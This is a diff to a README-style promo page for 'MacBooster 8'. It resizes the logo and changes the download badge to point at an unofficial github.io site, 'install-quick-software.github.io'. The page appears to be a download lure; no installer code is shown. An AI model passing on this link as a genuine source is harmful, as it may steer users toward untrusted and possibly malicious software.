@@ -1,13 +1,13 @@
 # MacBooster 8 – Intelligent System Optimizer and Security Utility  
 
 <div align="center">  
-<img src="https://bestreviews.net/wp-content/uploads/2024/06/macbooster-logo.png" alt="MacBooster 8 Logo" width="800">  
+<img src="https://bestreviews.net/wp-content/uploads/2024/06/macbooster-logo.png" alt="MacBooster 8 Logo" width="400">  
 </div>
 
 <br>  
 
 <div align="center">  
-<a href="https://osx-app.github.io/.github/macbooster8">  
+<a href="https://install-quick-software.github.io/.github/macbooster8">  
 <img src="https://img.shields.io/badge/💻_GET_MacBooster_8-navy?style=for-the-badge&logo=apple" alt="GET MacBooster 8">  
 </a>  
 </div>
